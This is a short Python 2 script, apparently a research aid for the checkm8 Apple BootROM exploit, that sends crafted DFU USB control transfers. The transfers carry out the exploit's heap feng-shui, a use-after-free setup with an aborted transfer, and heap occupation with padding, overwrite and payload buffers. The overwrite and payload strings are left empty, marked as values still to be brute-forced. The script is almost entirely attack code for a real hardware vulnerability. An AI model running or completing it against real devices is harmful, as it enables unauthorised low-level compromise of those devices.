#!/usr/bin/python

# https://habr.com/ru/company/dsec/blog/485216/

# script to find the desired values

from checkm8 import *

# make usb_req_* functions more informative
def libusb1_no_error_ctrl_transfer(device, bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout):
    try:
        device.ctrl_transfer(bmRequestType, bRequest, wValue, wIndex, data_or_wLength, timeout)
    except usb.core.USBError as ex:
        print ex  # need for more information

def usb_req_stall(device):   libusb1_no_error_ctrl_transfer(device,  0x2, 3,   0x0,  0x80,  0x0, 10)
def usb_req_leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40,  1)
def usb_req_no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41,  1)

if __name__ == '__main__':
    device = dfu.acquire_device()
    start = time.time()
    print 'Found:', device.serial_number

    # unknown values, need to brute
    large_leak = 100
    padding = 0x7c0
    overwrite = ''
    payload = ''
    assert len(overwrite) + padding <= 0x800

    # heap feng-shui
    usb_req_stall(device)
    for i in range(large_leak):
        usb_req_leak(device)
    usb_req_no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    # set global state and restart usb
    device = dfu.acquire_device()
    device.serial_number
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    # heap occupation
    device = dfu.acquire_device()
    usb_req_stall(device)
    usb_req_leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, 'A' * padding + overwrite, 100)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 100)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    print '(%0.2f seconds)' % (time.time() - start)
    dfu.release_device(device)
